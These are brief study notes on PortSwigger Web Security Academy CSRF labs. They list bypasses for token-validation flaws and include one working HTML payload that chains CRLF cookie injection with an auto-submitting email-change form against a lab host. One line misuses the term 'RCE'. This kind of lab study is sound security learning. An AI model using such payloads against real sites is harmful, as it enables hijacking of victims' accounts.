# CSRF

## Practitioner
- CSRF where token validation depends on request method
    - Notice that CSRF validation does not exist for GET requests. Use the exploit server to stage a RCE which automatically triggers a GET request to the /change-email endpoint and submits on page load.
- CSRF where token validation depends on token being present
    - Similar exploit, but it's a POST request and simply does not include the CSRF token.
- CSRF where the token is not tied to the user session
    - Similar–– craft a malicious form using the unused CSRF token from another user to trick the server.
- CSRF where token is tied to non-session cookie
- CSRF where token is duplicated in cookie
    - Since the server merely checks if the csrf token matches the cookie, we stage an exploit to update the search query parameter sink to set a fake crsf cookie, and set the csrf token to the same fake value.
    ```
    <form action="https://0ae800630314cfa683893c200074004f.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="evil@hacker.net" />
    <input type="hidden" name="csrf" value="fake" />
    </form>
    <img src="https://0ae800630314cfa683893c200074004f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();" />
    ```